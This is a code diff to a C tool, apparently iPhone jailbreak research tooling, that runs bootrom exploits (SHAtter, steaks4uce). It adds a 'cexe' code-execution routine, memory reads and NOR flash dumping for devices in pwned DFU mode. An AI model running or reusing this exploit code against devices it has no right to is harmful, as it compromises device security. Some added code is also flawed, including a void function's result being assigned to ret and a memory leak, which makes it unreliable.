@@ -126,6 +126,17 @@ void usb_reset(irecv_client_t client) {
     return;
 }
 
+int reconnect(irecv_client_t *client) {
+    printf("Reconnecting to device.\n");
+    irecv_client_t new_client = irecv_reconnect(*client, 2);
+    if (new_client == NULL) {
+        fprintf(stderr, "ERROR: Unable to reconnect to device.\n");
+        return -1;
+    }
+    *client = new_client;
+    return 0;
+}
+
 int send_data(irecv_client_t client, const unsigned char* data, size_t data_len) {
     size_t index = 0;
     printf("Sending 0x%zx bytes of data to device.\n", data_len);
@@ -143,17 +154,38 @@ int send_data(irecv_client_t client, const unsigned char* data, size_t data_len)
     return 0;
 }
 
-int get_data(irecv_client_t client, size_t amount){
+int get_data(irecv_client_t client, size_t amount, unsigned char **out_data) {
     int ret;
-    unsigned char part[MAX_PACKET_SIZE];
-    printf("Getting 0x%zx bytes of data from device.\n", amount);
-
-    for(int i = 0; i < amount; i += MAX_PACKET_SIZE){
-        int transfer_size = (amount - i < MAX_PACKET_SIZE) ? (amount - i) : MAX_PACKET_SIZE;
-        ret = irecv_usb_control_transfer(client, 0xA1, 2, 0, 0, part, transfer_size, 100);
+    unsigned char *data = malloc(amount);
+    if (!data) {
+        fprintf(stderr, "ERROR: Unable to allocate memory for get_data.\n");
+        return -1;
     }
 
-    return ret;
+    size_t offset = 0;
+    printf("Getting 0x%zx bytes of data from device.\n", amount);
+
+    while (amount > 0) {
+        int chunk = (amount > MAX_PACKET_SIZE) ? MAX_PACKET_SIZE : (int)amount;
+
+        ret = irecv_usb_control_transfer(client, 0xA1, 2, 0, 0, data + offset, chunk, 5000);
+        if (ret < 0) {
+            fprintf(stderr, "ERROR: USB control transfer failed with code %d.\n", ret);
+            free(data);
+            return ret;
+        }
+        if (ret != chunk) {
+            fprintf(stderr, "ERROR: USB control transfer returned unexpected size %d (expected %d).\n", ret, chunk);
+            free(data);
+            return -2;
+        }
+
+        offset += chunk;
+        amount -= chunk;
+    }
+
+    *out_data = data;
+    return 0;
 }
 
 int request_image_validation(irecv_client_t client) {
@@ -254,15 +286,18 @@ int steaks4uce_exploit(irecv_client_t client) {
 
 int shatter_exploit(irecv_client_t client) {
     int ret;
+    unsigned char *buffer = NULL;
     printf("*** based on SHAtter exploit (segment overflow) by posixninja and pod2g ***\n");
 
     ret = reset_counters(client);
     if (ret < 0)
         return -1;
 
-    ret = get_data(client, 0x40);
-    if (ret < 0)
+    ret = get_data(client, 0x40, &buffer);
+    if (ret < 0) {
+        free(buffer);
         return -1;
+    }
 
     usb_reset(client);
 
@@ -282,9 +317,11 @@ int shatter_exploit(irecv_client_t client) {
     if (ret < 0)
         return -1;
 
-    ret = get_data(client, 0x2C000);
-    if (ret < 0)
+    ret = get_data(client, 0x2C000, &buffer);
+    if (ret < 0) {
+        free(buffer);
         return -1;
+    }
 
     release_device(client);
 
@@ -298,9 +335,11 @@ int shatter_exploit(irecv_client_t client) {
     if (ret < 0)
         return -1;
 
-    ret = get_data(client, 0x140);
-    if (ret < 0)
+    ret = get_data(client, 0x140, &buffer);
+    if (ret < 0) {
+        free(buffer);
         return -1;
+    }
 
     usb_reset(client);
 
@@ -324,9 +363,12 @@ int shatter_exploit(irecv_client_t client) {
     if (ret < 0)
         return -1;
 
-    ret = get_data(client, 0x2C000);
-    if (ret < 0)
+    ret = get_data(client, 0x2C000, &buffer);
+    if (ret < 0) {
+        free(buffer);
         return -1;
+    }
+    free(buffer);
 
     release_device(client);
 
@@ -395,6 +437,203 @@ int boot_unpacked_ibss(irecv_client_t client, const char *ibss_path) {
     return 0;
 }
 
+int execute(irecv_client_t client, const unsigned char *cmd_buf, size_t cmd_len, unsigned char *recv_buf, size_t recv_len, uint32_t *retval_out) {
+    int ret;
+
+    ret = acquire_device(&client);
+    if (ret < 0)
+        return -1;
+
+    ret = reset_counters(client);
+    if (ret < 0)
+        return -1;
+
+    ret = usb_reset(client);
+    if (ret < 0)
+        return -1;
+
+    release_device(client);
+
+    ret = acquire_device(&client);
+    if (ret < 0)
+        return -1;
+
+    size_t payload_len = 4 + cmd_len;
+    unsigned char *payload = malloc(payload_len);
+    if (!payload) return -1;
+
+    memcpy(payload, "cexe", 4);
+    memcpy(payload + 4, cmd_buf, cmd_len);
+
+    ret = send_data(client, payload, payload_len);
+    free(payload);
+    if (ret < 0)
+        return -1;
+
+    ret = request_image_validation(client);
+    if (ret < 0)
+        return -1;
+
+    release_device(client);
+
+    usleep(500000);
+
+    ret = acquire_device(&client);
+    if (ret < 0)
+        return -1;
+
+    size_t required_len = 8 + recv_len;
+    if (required_len % MAX_PACKET_SIZE != 0)
+        required_len = ((required_len / MAX_PACKET_SIZE) + 1) * MAX_PACKET_SIZE;
+
+    unsigned char *response = malloc(required_len);
+    if (!response)
+        return -1;
+
+    ret = get_data(client, required_len, &response);
+    if (ret < 0) {
+        free(response);
+        return -1;
+    }
+
+    release_device(client);
+
+    uint32_t exec_cleared = *(uint32_t *)(response);
+    uint32_t retval = *(uint32_t *)(response + 4);
+
+    if (exec_cleared != 0) {
+        free(response);
+        fprintf(stderr, "Execution failed: exec_cleared != 0\n");
+        return -1;
+    }
+
+    if (retval_out)
+        *retval_out = retval;
+
+    if (recv_len > 0 && recv_buf != NULL) {
+        memcpy(recv_buf, response + 8, recv_len);
+    }
+
+    free(response);
+    return 0;
+}
+
+uint32_t memmove_off = 0x83d4;
+uint32_t load_address = 0x84000000;
+
+unsigned char* read_memory(irecv_client_t client, uint32_t address, uint32_t length) {
+    uint32_t args[4];
+    args[0] = memmove_off;
+    args[1] = load_address + 8;
+    args[2] = address;
+    args[3] = length;
+
+    unsigned char* buffer = malloc(length);
+    if (!buffer) {
+        fprintf(stderr, "ERROR: Failed to allocate memory for read_memory\n");
+        return NULL;
+    }
+
+    uint32_t retval = 0;
+    int ret = execute(client, (unsigned char*)args, sizeof(args), buffer, length, &retval);
+    if (ret < 0) {
+        free(buffer);
+        return NULL;
+    }
+
+    return buffer;
+}
+
+int nor_dump(irecv_client_t client, int save_backup) {
+    const uint32_t get_block_device = 0x1351; // for S5L8920
+    const uint32_t NOR_PART_SIZE = 0x20000;
+    const int NOR_PARTS = 8;
+
+    // Allocate request buffer: 4 uint32_t + 5 bytes for "nor0\0"
+    unsigned char* request = malloc(4 * sizeof(uint32_t) + 5);
+    if (!request) {
+        fprintf(stderr, "ERROR: Memory allocation failed\n");
+        return -1;
+    }
+
+    uint32_t* args = (uint32_t*)request;
+    args[0] = get_block_device;
+    args[1] = load_address + 12;
+    memcpy(request + 8, "nor0", 5); // include null terminator
+
+    unsigned char dummy[1];
+    uint32_t bdev = 0;
+    release_device(client);
+    int ret = execute(client, request, 13, dummy, 0, &bdev);
+
+    free(request);
+
+    if (ret < 0 || bdev == 0) {
+        fprintf(stderr, "ERROR: Unable to dump NOR. Pointer to nor0 block device was NULL.\n");
+        return -1;
+    }
+
+    unsigned char* data = read_memory(client, bdev + 28, 4);
+    if (!data) {
+        fprintf(stderr, "ERROR: Unable to dump NOR. Failed to read function pointer.\n");
+        return -1;
+    }
+
+    uint32_t read_func;
+    memcpy(&read_func, data, 4);
+    free(data);
+
+    if (read_func == 0) {
+        fprintf(stderr, "ERROR: Unable to dump NOR. Function pointer for reading was NULL.\n");
+        return -1;
+    }
+
+    unsigned char* full_nor = malloc(NOR_PARTS * NOR_PART_SIZE);
+    if (!full_nor) {
+        fprintf(stderr, "ERROR: Failed to allocate NOR buffer\n");
+        return -1;
+    }
+
+    for (int i = 0; i < NOR_PARTS; i++) {
+        printf("Dumping NOR, part %d/%d.\n", i + 1, NOR_PARTS);
+
+        uint32_t req[6] = {
+            read_func,
+            bdev,
+            load_address + 8,
+            (uint32_t)(i * NOR_PART_SIZE),
+            0,
+            NOR_PART_SIZE
+        };
+
+        uint32_t retval = 0;
+        unsigned char* part = full_nor + i * NOR_PART_SIZE;
+
+        ret = execute(client, (unsigned char*)req, sizeof(req), part, NOR_PART_SIZE, &retval);
+        if (ret < 0) {
+            fprintf(stderr, "ERROR: Failed dumping NOR part %d\n", i + 1);
+            free(full_nor);
+            return -1;
+        }
+    }
+
+    if (save_backup) {
+        FILE* f = fopen("nor.dump", "wb");
+        if (f) {
+            fwrite(full_nor, 1, NOR_PART_SIZE * NOR_PARTS, f);
+            fclose(f);
+            printf("NOR backed up to file: %s\n", "nor.dump");
+        } else {
+            fprintf(stderr, "ERROR: Could not open file for writing NOR backup.\n");
+            free(full_nor);
+            return -1;
+        }
+    }
+
+    free(full_nor);
+    return 0;
+}
+
 int main(int argc, char* argv[]) {
     int ret;
     int (*exploit_func)(irecv_client_t client) = NULL;
@@ -407,12 +646,21 @@ int main(int argc, char* argv[]) {
     const struct irecv_device_info *devinfo = irecv_get_device_info(client);
     char* p = strstr(devinfo->serial_string, "PWND:[");
 
+    if (strstr(devinfo->srtg, "359.3.2"))
+        memmove_off = 0x83dc;
+
     if (argc > 1) {
-        if (p) {
+        if (p && strcmp(argv[1], "dumpnor") == 0 && devinfo->cpid == 0x8920) {
+            ret = nor_dump(client, 1);
+            return ret;
+        } else if (p && strcmp(argv[1], "flashnor") == 0 && devinfo->cpid == 0x8920) {
+            // ret = nor_flash(client, argv[2]);
+            // return ret;
+        } else if (p) {
             ret = boot_unpacked_ibss(client, argv[1]);
             return ret;
         } else {
-            fprintf(stderr, "ERROR: Device is not in pwned DFU mode. Cannot boot unpacked iBSS.\n");
+            fprintf(stderr, "ERROR: Device is not in pwned DFU mode. Cannot do pwned DFU stuff.\n");
             return -1;
         }
     } else if (p) {
